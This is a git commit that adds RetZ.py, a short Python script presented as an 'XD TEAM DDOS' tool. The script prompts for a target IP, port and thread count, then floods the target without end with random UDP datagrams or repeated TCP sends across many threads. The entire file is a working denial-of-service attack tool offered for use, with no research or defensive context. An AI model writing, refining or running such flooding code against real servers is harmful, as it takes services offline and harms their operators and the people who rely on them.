d938d33f009f48952d09ed5adf6e0f8f2275b271
XdRetZ <92245099+XdRetZ@users.noreply.github.com>
2021-10-10 14:00:26 +0700

    Add files via upload

---
+++ RetZ.py
@@ -0,0 +1,51 @@
+#!/usr/bin/env python3
+#Code by LeeOn123
+#remake by Retz
+import random
+import socket
+import threading
+
+print("--> CREDITS : LEOON TCP UDP <--")
+print("--> REMAKE BY RetZ <--")
+print("--> XD TEAM DDOS <--")
+print("#-- JOIN THIS IS COMUNITY --#")
+ip = str(input(" IP:"))
+port = int(input(" PORT:"))
+choice = str(input(" Y ORE N(y/n):"))
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" MengEtek Server!!!")
+		except:
+			print("[!] MengEtek Server!!!")
+
+def run2():
+	data = random._urandom(160)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" MengEtek Server!!!")
+		except:
+			s.close()
+			print("[*] MengEtek Server")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
